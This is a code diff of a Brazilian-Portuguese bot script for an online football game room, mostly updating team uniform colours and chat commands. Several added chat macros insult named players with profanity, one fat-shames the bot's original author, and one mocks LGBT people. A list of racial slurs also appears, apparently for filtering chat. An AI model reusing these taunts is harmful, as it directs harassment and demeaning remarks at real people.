+    '!fort2': [90, 0xFFFFFF, [0xEA3844, 0xA52E34, 0xEA3844]], // Fortaleza 2
+    '!vas': [53, 0xFF0000, [0xFAFAFA, 0x000000, 0xFAFAFA]], // Vasco 1
+    '!vas2': [53, 0xFF0000, [0x000000, 0xFAFAFA, 0x000000]], // Vasco 2
+    '!pal': [53, 0xFFFFFD, [0x195440, 0x21775A, 0x195440]], // palmeiras 1
+    '!pal2': [140, 0x004D49, [0xEBEFF3, 0x32A39C, 0xEBEFF3]], // palmeiras 2
+    '!pal3': [60, 0xFDCF44, [0x7DC49C, 0x8CC6A5]], // palmeiras 3
+    '!pal4': [0, 0xFFFFFD, [0x466329, 0xF0F0F2, 0x466329]], // palmeiras 4
+    '!brag': [0, 0xE43635, [0xEFEDEE, 0xF9F9F9, 0xEFEDEE]], // Bragantino 1
+    '!brag2': [60, 0xF6F5F6, [0x3B383B, 0x2C282E, 0x3B383B]], // Bragantino 2
+    '!brag3': [45, 0xFFFFFF, [0xCB0D2F, 0xDA2534, 0xB70D28]], // Bragantino 3
     '!cap2': [56, 0xFFFFFF, [0xFF2121, 0x262626, 0xFF2121]],
-    '!flu': [180, 0xFFFFFF, [0x1D3825, 0x961400, 0x1D3825]],
-    '!flu2': [0, 0xFAFAFA, [0x0D8267, 0x891021, 0x0D8267]],
+    '!flu': [180, 0xFFFFFF, [0x1D3825, 0x961400, 0x1D3825]], // Fluminense 1
+    '!flu2': [90, 0x3A3537, [0x8E2C2D, 0xFFFFFF, 0x075E50]], // Fluminense 2
+    '!flu3': [145, 0xF3F4FB, [0x912A38, 0x672127, 0x912A38]], // Fluminense 3
     '!bot': [180, 0xFFFFFF, [0x000000, 0x262626, 0x000000]],
     '!bot2': [0, 0x404040, [0x000000, 0xFFFFFF, 0x000000]],
-    '!san': [180, 0xFFFFFF, [0x007E87]],
-    '!san2': [0, 0x000000, [0xFFFFFF]],
-    '!san3': [0, 0xB0B0B0, [0xFAFAFA, 0x101010, 0xFAFAFA]],
-    '!goi': [90, 0xFAFAFA, [0x164535]], //goias
-    '!goi2': [0, 0xDFE2F1, [0x02424B, 0x047386, 0x02424B]],
-    '!goi3': [270, 0x023A47, [0xEDEEF3, 0xEDEEF3, 0x2B515A]],
-    '!goi4': [60, 0x01CF4A, [0x0F2A28, 0x0F2A28, 0x0F2A28]],
+    '!san': [60, 0x191911, [0xFFFFFF, 0xFFF5F5]], // santos 1
+    '!san2': [0, 0x000000, [0xFFFFFF]], // santos 2
+    '!san3': [0, 0xB0B0B0, [0xFAFAFA, 0x101010, 0xFAFAFA]], // santos3
+    '!goi': [90, 0xFAFAFA, [0x164535]], //goias 1
+    '!goi2': [0, 0xDFE2F1, [0x02424B, 0x047386, 0x02424B]], // Goias 2
+    '!goi3': [270, 0x023A47, [0xEDEEF3, 0xEDEEF3, 0x2B515A]], // Goias 3
+    '!goi4': [60, 0x01CF4A, [0x0F2A28, 0x0F2A28, 0x0F2A28]], // Goias 4
     '!int': [90, 0xFAFAFA, [0xC90000, 0x990000, 0xC90000]],
-    '!gre': [0, 0xFFFFFF, [0x75ACFF, 0x000000, 0x75ACFF]],
-    '!amg': [0, 0xFFFFFF, [0x109600, 0x000000, 0x109600]],
-    '!amg2': [180, 0x0044FF, [0xFFEDED, 0xFF0D0D]],
-    '!amg3': [180, 0xFF00E6, [0x00083B]],
+    '!gre': [0, 0xFFFFFF, [0x75ACFF, 0x000000, 0x75ACFF]], // Grêmio 1
+    '!gre2': [60, 0x07B9F0, [0xFFFDF7, 0xF7FFED, 0xF7F5F0]], // Grêmio 2
+    '!gre3': [90, 0xE9EFE5, [0x328ACA, 0x6DAFD1, 0x328ACA]], // Grêmio 3
+    '!amg': [0, 0x1E1E20, [0xEAE9EE, 0xDCD5DB, 0xEAE9EE]], // Atlético Mineiro 1
+    '!amg2': [0, 0xC2C4D1, [0x090A0C, 0x0A0B0F, 0x090A0C]], // Atlético Mineiro 2
+    '!ami': [0, 0xFFFFFF, [0x109600, 0x000000, 0x109600]], // America Mineiro 1
+    '!ami2': [60, 0x5CCC33, [0xFFFFFF]], // America Mineiro 2
+    '!ami3': [60, 0xFFECD2, [0x122825, 0x243735]], // America Mineiro 3
+
 
     //Série B
     '!sam': [0, 0x000000, [0xDE0000, 0xFFF700, 0x156B00]], //Sampaio Correia
@@ -290,24 +360,24 @@ var uniList = {
     '!abc2': [0, 0x1A191E, [0x515561, 0xAEB1C2, 0x505364]],
     '!ava': [0, 0x053364, [0x024D90, 0xDEDDE2, 0x024D90]], //Avaí
     '!ava2': [90, 0x6FA7CA, [0x004B9E, 0xE6EEF0, 0xE6EEF0]],
-    '!cri': [90, 0xFFFFFF, [0xE4C918, 0x0E0E0E, 0xD9D9D9]], //Criciúma
-    '!cri2': [90, 0xE0C111, [0x000000, 0xECECEC, 0xECECEC]],
-    '!cri3': [0, 0xFFFFFF, [0xDDA510, 0x000000, 0xDDA510]],
+    '!cri': [90, 0xFFFFFF, [0xE4C918, 0x0E0E0E, 0xD9D9D9]], //Criciúma 1
+    '!cri2': [90, 0xE0C111, [0x000000, 0xECECEC, 0xECECEC]], //Criciúma 2
+    '!cri3': [0, 0xFFFFFF, [0xDDA510, 0x000000, 0xDDA510]], //Criciúma 3
     '!gua': [0, 0xFFFFFF, [0x095A53, 0x014842]], //Guarani
     '!gua2': [90, 0x12614C, [0xF4F0EF, 0xF4F0EF, 0x138762]],
     '!gua3': [0, 0xFFFFFF, [0x03C263, 0x004A2F, 0x03C263]],
-    '!juv': [0, 0xFFFFFF, [0x0D8E4E, 0xD9D0D1, 0x0D8E4E]], //Juventude
-    '!juv2': [120, 0x0BC892, [0xDAD7E8, 0xDAD7E8, 0x289079]],
-    '!juv3': [40, 0x8DE342, [0x07060C, 0x07060C, 0x22EB77]],
+    '!juv': [0, 0xFFFFFF, [0x0D8E4E, 0xD9D0D1, 0x0D8E4E]], // Juventude 1
+    '!juv2': [120, 0x0BC892, [0xDAD7E8, 0xDAD7E8, 0x289079]], // Juventude 2
+    '!juv3': [40, 0x8DE342, [0x07060C, 0x07060C, 0x22EB77]], // Juventude 3
     '!mir': [60, 0x084334, [0xFFE81C]], // Mirassol
     '!mir2': [60, 0xFFFFFF, [0x1D4840, 0xEFC209, 0x1D4840]],
     '!mir3': [270, 0xBBA242, [0x2A426E]],
     '!nov': [0, 0xFFFFFF, [0xF2B855, 0x1B1C2E, 0xF2B855]], //Novorizontino
     '!nov2': [90, 0x312C3E, [0xC8CDF7, 0xE7AB42]],
     '!nov3': [0, 0xFFFFFF, [0x0C0912, 0xF5EB55, 0x0C0912]],
-    '!pont': [40, 0xFFFFFF, [0xD4CED2, 0x02000E, 0xD4CED2]], // Ponte Preta
-    '!pont2': [40, 0x000000, [0x1A1227, 0xD9D0D5, 0x1A1227]],
-    '!pont3': [40, 0xFFFFFF, [0xCED3D6, 0x575C5F, 0x010302]],
+    '!pont': [40, 0xFFFFFF, [0xD4CED2, 0x02000E, 0xD4CED2]], // Ponte Preta 1
+    '!pont2': [40, 0x000000, [0x1A1227, 0xD9D0D5, 0x1A1227]], // Ponte Preta 2
+    '!pont3': [40, 0xFFFFFF, [0xCED3D6, 0x575C5F, 0x010302]], // Ponte Preta 3
 
     //Série C
     '!pay': [90, 0x7AF2FF, [0x006FFF, 0x2E9DFF, 0x70B3FF]],
@@ -363,44 +433,40 @@ var uniList = {
     '!vr3': [64, 0x41DB00, [0x141414, 0x191919, 0x212121]],
     '!vr2': [0, 0x20232D, [0xFFFFFF, 0xCCC9CD, 0xF7F5F5]],
     '!vr3': [90, 0xFFFFFF, [0xFEF600, 0x000000, 0x000000]],
-    '!ypi': [60, 0x005238, [0xFEE600]], //Ypiranga de Erechim
-    '!ypi2': [60, 0xFFFFFF, [0x00704F]],
-    '!ypi3': [0, 0x5A6794, [0xC0DAE9, 0x68A4C8]],
+    '!ypi': [60, 0x005238, [0xFEE600]], // Ypiranga de Erechim 1
+    '!ypi2': [60, 0xFFFFFF, [0x00704F]], // Ypiranga de Erechim 2
+    '!ypi3': [0, 0x5A6794, [0xC0DAE9, 0x68A4C8]], // Ypiranga de Erechim 3
 
     //Série D
-    '!trem': [90, 0xF3F8F4, [0xFF0018, 0x2F2929, 0xFF0018]],//Trem Desportivo
-    '!trem2': [0, 0xD9D7D8, [0x0F161E, 0xC6001A]],
-    '!tocan': [60, 0xF2F3EE, [0x4C9E65]],//Tocantinópolis
-    '!tocan2': [60, 0x77C977, [0xFCFEFB]],
-    '!santc': [90, 0xFFFFFF, [0x050409, 0xCA2E3B]],//Santa Cruz
-    '!santc2': [90, 0x181B2A, [0xF1F2F7, 0xE04447]],
-    '!glo': [90, 0xFFFFFF, [0xCD455B, 0x171516]],//Globo
-    '!glo2': [90, 0xFFFFFF, [0x000000, 0x621825, 0xA27615]],
-    '!alago': [0, 0xEDEDED, [0x232832, 0xBF3443]],//Atlético de Alagoinhas
-    '!alago2': [90, 0xFFFFFF, [0x121116, 0x980611]],
-    '!alago3': [60, 0xD2C76D, [0x0E0F14]],
-    '!brasi': [0, 0x1C6A12, [0xEA9A01, 0xEA9A01, 0xE7E7E7]],//Brasiliense
-    '!brasi2': [60, 0xFCFA05, [0x0D0B18]],
-    '!andre': [60, 0x112379, [0xE4E7EE]],//Santo André
-    '!andre2': [230, 0xE9EBE6, [0x1633B5, 0x22245D]],
-    '!ferro': [60, 0xEEF2FB, [0x412B2E]],//Ferroviária
-    '!ferro2': [60, 0x432A2E, [0xEDF3F3]],
-    '!brapel': [60, 0x454648, [0xF57582]],//Brasil de Pelotas
-    '!brapel2': [45, 0xFCFCFC, [0xBD2232, 0x111113]],
+    '!trem': [90, 0xF3F8F4, [0xFF0018, 0x2F2929, 0xFF0018]], // Trem Desportivo 1
+    '!trem2': [0, 0xD9D7D8, [0x0F161E, 0xC6001A]], // Trem Desportivo 2
+    '!tocan': [60, 0xF2F3EE, [0x4C9E65]], // Tocantinópolis 1
+    '!tocan2': [60, 0x77C977, [0xFCFEFB]], // Tocantinópolis 2
+    '!santc': [90, 0xFFFFFF, [0x050409, 0xCA2E3B]], // Santa Cruz 1
+    '!santc2': [90, 0x181B2A, [0xF1F2F7, 0xE04447]], // Santa Cruz 1
+    '!glo': [90, 0xFFFFFF, [0xCD455B, 0x171516]], // Globo 1
+    '!glo2': [90, 0xFFFFFF, [0x000000, 0x621825, 0xA27615]], // Globo 1
+    '!alago': [0, 0xEDEDED, [0x232832, 0xBF3443]], // Atlético de Alagoinhas 1
+    '!alago2': [90, 0xFFFFFF, [0x121116, 0x980611]], // Atlético de Alagoinhas 2
+    '!alago3': [60, 0xD2C76D, [0x0E0F14]], // Atlético de Alagoinhas 3
+    '!brasi': [0, 0x1C6A12, [0xEA9A01, 0xEA9A01, 0xE7E7E7]], // Brasiliense 1
+    '!brasi2': [60, 0xFCFA05, [0x0D0B18]], // Brasiliense 2
+    '!andre': [60, 0x112379, [0xE4E7EE]], // Santo André 1
+    '!andre2': [230, 0xE9EBE6, [0x1633B5, 0x22245D]], // Santo André 2
+    '!ferro': [60, 0xEEF2FB, [0x412B2E]], // Ferroviária 1
+    '!ferro2': [60, 0x432A2E, [0xEDF3F3]], // Ferroviária 2
+    '!brapel': [60, 0x454648, [0xF57582]], // Brasil de Pelotas 1
+    '!brapel2': [45, 0xFCFCFC, [0xBD2232, 0x111113]], // Brasil de Pelotas 2
 
     //Outros
     '!pr': [0, 0xFFFFFF, [0xE30000, 0x0006BF]],
-    '!ibis': [90, 0xDADFE3, [0x332C34, 0x822A38, 0xE13F4C]], //Ibis
-    '!ibis2': [90, 0xFFFFFF, [0x000000, 0x8C0000, 0xC90000]],
-    '!loud': [1, 0x1CFF33, [0x000000]],
-    '!lsg': [1, 0x000000, [0xFFA319]],
-    '!c9': [1, 0x2EF8FF, [0xFFFFFF]],
-    '!furia': [1, 0xFFFFFF, [0x000000]],
-    '!fx': [0, 0xFFFFFF, [0x000000, 0xBA19FF, 0x000000]],
-    '!bronze': [1, 0x8C7853, [0x8C7853]],
-    '!ouro': [1, 0xFFD700, [0xFFD700]],
-    '!prata': [1, 0xC0C0C0, [0xC0C0C0]],
-    '!diamante': [1, 0x0CDED8, [0x0CDED8]],
+    '!ibis': [90, 0xDADFE3, [0x332C34, 0x822A38, 0xE13F4C]], // Ibis 1
+    '!ibis2': [90, 0xFFFFFF, [0x000000, 0x8C0000, 0xC90000]], // Ibis 2
+    '!inter2': [60, 0xD33F40, [0xF3F1F6]], // Internacional 1
+    '!inter3': [60, 0xFF0000, [0x151518, 0x28282A]], // Internacional 2
+    '!alain': [135, 0xFFFFFF, [0x1E1E1C, 0x4F3179, 0x1E1E1C]], // Al Ain
+    '!mazb': [45, 0xFFFFFF, [0x3A3A3A, 0xBABABA, 0x3A3A3A]], // Mazembe
+    '!rajs': [60, 0x427C70, [0xF2F2F2, 0xDAD8D9, 0xF2F2F2]], // Raja Casablanca
 
     //Estrangeiros
     '!atl4': [180, 0x333333, [0xFAEDED, 0x000000]],
@@ -449,16 +515,26 @@ var uniList = {
     '!feye2': [60, 0xE8EDF1, [0x076186]],
     '!estu': [0, 0x0C0C0C, [0xC01319, 0xF5FBF1, 0xC01319]], //Estudiantes
     '!estu2': [90, 0xE31B1D, [0xFFFFFF, 0xFFFFFF, 0xFF0000]],
-    '!olim': [90, 0xFFFFFF, [0xF8F9FD, 0x32353A, 0xF8F9FD]], //Olimpia
-    '!olim2': [90, 0x141416, [0x090C13, 0xF5F5F5, 0x090C13]],
+    '!olim': [90, 0xCFCCCD, [0xE9E9E9, 0x24252B, 0xE9E9E9]], // Olimpia 1
+    '!olim2': [90, 0x141416, [0x090C13, 0xF5F5F5, 0x090C13]], // Olimpia 2
     '!raci': [90, 0x201D20, [0x4789B5, 0xD7D3CE, 0xD7D3CE]], //Racing
     '!raci2': [0, 0xECECF0, [0x1C1A1B, 0x5299C1, 0x1C1A1B]],
     '!vele': [130, 0x242843, [0xDCE1F4, 0x04419C, 0xDCE1F4]], //Vélez Sarsfield
     '!vele2': [130, 0x242843, [0x02318D, 0xE1E1E3, 0x02318D]],
-    '!ars': [226, 0xFFFFFF, [0xFFFFFF, 0x9E0000, 0xCF0000]], //Arsenal
-    '!ars2': [226, 0xFFDF00, [0x9E0000, 0x9E0000, 0x9E0000]],
+    '!ars': [226, 0xFFFFFF, [0xFFFFFF, 0x9E0000, 0xCF0000]], // Arsenal 1
+    '!ars2': [226, 0xFFDF00, [0x9E0000, 0x9E0000, 0x9E0000]], // Arsenal 2
+    '!colo': [60, 0x1E1E1E, [0xF2F2F2, 0xF2F2F2, 0xD35B65]], // Colo Colo
+    '!bolivar': [50, 0x003999, [0x569FFB, 0xA2E9FF, 0x569FFB]], // Bolivar
+    '!alll': [0, 0xF4F4F6, [0x022157, 0x02296B, 0x022157]], // Allianza Lima
+    '!emlc': [135, 0xE8E8E8, [0x12216E, 0x525F8D, 0x12216E]], // Emelec
+    '!oncds': [0, 0x121E46, [0x064010, 0xD1D1D1, 0x5B120C]], // Once Caldas
+    '!dtar': [0, 0xF0F0F0, [0xFAD502, 0x171715, 0xFAD502]], // Deportiva Táchira
+    '!atn': [0, 0x18272C, [0xE8EBF4, 0x188B6A, 0xE8EBF4]], // Atlético Nacional
+    '!sl': [0, 0xFEFEF6, [0x3C4564, 0xD5302E]], // San Lorenzo
+    '!lus': [60, 0x713849, [0x411F37]], // Lánus
+    '!defj': [60, 0x0A9166, [0xF4D03C, 0xEFCD38]], // Defensa y Justicia
     /* 
-             !ice /colors red 90 FFFFFF FFA8F1 FFA8F1 FFA8F1
+            !ice /colors red 90 FFFFFF FFA8F1 FFA8F1 FFA8F1
             vip
             !sky
             /colors red 60 D1D1D1 82C5FF 82C5FF 82C5FF 
@@ -489,6 +565,12 @@ var uniList = {
     
             */
 }
+let prefixTeamChatString = "!t ";
+var chatVipCommand = "!cv";
+var chatAdmCommand = "!ac";
+
+let palavras = ["macaco", "preto", "primata", "negro"],
+    regex = new RegExp(palavras.join("|"), 'gi');
 
 var provos = {
     '!ali': 'Alisa meu pelo 🐆',
@@ -558,7 +640,7 @@ var provos = {
     '!volt': 'Volta pra defesa! 👉',
     '!vl': 'Alguém VL? 👇',
     '!x': 'Aperta ✖ ❕❕',
-    '!zag': 'Cadê a zaga? 👨🏼‍🦯 ', // Bot desenvolvido pelo OBL
+    '!zag': 'Cadê a zaga? 👨🏼‍🦯 ',
     '!zen': 'Zen 🧘',
     '!divisao': 'EU SOU O PROBLEMA DA DIVISÃO!!!',
     '!quentin': 'TÁ QUENTINHO AÍ? MEU BOLSO É DE VELUDO!',
@@ -567,11 +649,11 @@ var provos = {
     '!meto2': 'Eu meto mesmo!',
     '!boa': 'Boa time!👊',
     '!bai': 'Baila!💃',
-    '!bag': 'Bagre!🐟', // Bot desenvolvido pelo OBL
+    '!bag': 'Bagre!🐟',
     '!bike': 'De bike!!!🚲',
     '!bch': 'Belo chute!👏',
     '!bpa': 'Belo passe!👏',
-    '!brb': 'Brabo😈', // Bot desenvolvido pelo OBL
+    '!brb': 'Brabo😈',
     '!cal': 'Calma, pô!✨',
     '!fome': 'Hmmm que fominha...😋',
     '!fds': 'FDS!! Um ótimo final de semana!😎',
@@ -595,9 +677,9 @@ var provos = {
     '!peganunca': 'Pega nunk!!',
     '!quentin2': 'Tá quentinho ai????',
     '!izi': 'TEM COMO AUMENTAR O NÍVEL? TÁ MUITO EASY!',
-    '!piden': 'Ei Piden, vai tomar no c*, filha da put@!',
-    '!qsl': 'Ei Qsl, vai tomar no c*, filha da put@!',
-    '!system': 'Ei System, vai tomar no c*, filha da put@!',
+    '!ns': 'Ei Ns, vai tomar no c*, filha da put@!',
+    '!th7': 'Ei Th7, vai tomar no c*, filha da put@!',
+    '!dan': 'Ei Dan, vai tomar no c*, filha da put@!',
     '!oi': 'Oie ♥️',
     '!toma': 'Quem não faz... toma!',
     '!ifood': 'Olha o ifood! foi aqui que pediram a entrega?',
@@ -614,7 +696,7 @@ var provos = {
     '!receba': 'RECEBA C4R4LH0❗😤😤😤',
     '!meto': 'EU METO MESMO!!!',
     '!pega': 'QUERO VER PEGAR ESSA PORRA!!!',
-    '!toca2': 'Toca no pae e descansa...', // Bot desenvolvido pelo OBL
+    '!toca2': 'Toca no pae e descansa...',
     '!toca': 'Toca a bola!! 🦶',
     '!gk': 'Alguém GK?',
     '!gk2': 'ACORDA GOLEIRÃO!!!',
@@ -623,6 +705,9 @@ var provos = {
     '!gk5': 'Boa GK! ⛹️‍♀️',
     '!bobiu': 'BOBIU tomou ᵒᵗᵃ́ʳᶦᵒ. 𝗞𝗞𝗞𝗞𝗞𝗞🤣😂😅',
     '!oe': 'OEEE! Virou Space Bounce! 😅😅',
+    '!obl': 'Tinha que ser o GORDO DO OBL',
+    '!obl2': 'Ei OBL, vai tomar no c*, filha da put@!',
+    '!lgbt': "Yoyoy na escuta? Estão te chamando... 💅"
 }
 
 var fetchRecordingVariable = true;
@@ -630,4828 +715,88 @@ var fetchRecordingVariable = true;
 //"canBeStored":false
 
 const futsalNovo = `{
-    "name": " Vortex 🌀 |Bazinga",
+    "name": "X3",
     "width": 620,
     "height": 270,
-    "bg": {
-        "type": "hockey",
-        "width": 550,
-        "height": 240,
-        "kickOffRadius": 80,
-        "cornerRadius": 0
-    },
-    "vertexes": [
-        {
-            "x": 550,
-            "y": 240,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": -240,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 0,
-            "y": 270,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "x": 0,
-            "y": 80,
-            "bCoef": 0.15,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "x": 0,
-            "y": -80,
-            "bCoef": 0.15,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": -270,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "x": -550,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "x": -590,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "x": -590,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "x": -550,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "x": 590,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "x": 590,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "x": -550,
-            "y": 80,
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": -550,
-            "y": 240,
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": -550,
-            "y": -80,
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": -550,
-            "y": -240,
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": -550,
-            "y": 240,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": 240,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": 80,
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": 240,
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": -240,
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": -80,
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": -240,
-            "bCoef": 0,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": -240,
-            "bCoef": 0,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": -550,
-            "y": -240,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 550,
-            "y": -240,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 0,
-            "y": -240,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "x": 0,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "x": 0,
-            "y": 240,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "x": 0,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "x": 0,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "x": 0,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "x": 0,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -557.5,
-            "y": 80,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": -557.5,
-            "y": 240,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": -557.5,
-            "y": -240,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": -557.5,
-            "y": -80,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 557.5,
-            "y": -240,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 557.5,
-            "y": -80,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 557.5,
-            "y": 80,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 557.5,
-            "y": 240,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "x": 0,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": [],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -550,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -550,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 550,
-            "y": -80,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 550,
-            "y": 80,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -240,
-            "y": 256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -120,
-            "y": 256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -240,
-            "y": -256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -120,
-            "y": -224,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -120,
-            "y": -256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 240,
-            "y": 256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 120,
-            "y": 224,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 120,
-            "y": 256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 240,
-            "y": -224,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 240,
-            "y": -256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 120,
-            "y": -224,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 120,
-            "y": -256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -381,
-            "y": 240,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -381,
-            "y": 256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -550,
-            "y": 200,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -390,
-            "y": 70,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -550,
-            "y": 226,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -536,
-            "y": 240,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -550,
-            "y": -200,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -390,
-            "y": -70,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -550,
-            "y": -226,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -536,
-            "y": -240,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -556,
-            "y": 123,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -575,
-            "y": 123,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 556,
-            "y": 123,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 575,
-            "y": 123,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -556,
-            "y": -123,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -575,
-            "y": -123,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 556,
-            "y": -123,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 575,
-            "y": -123,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -381,
-            "y": -240,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -381,
-            "y": -256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
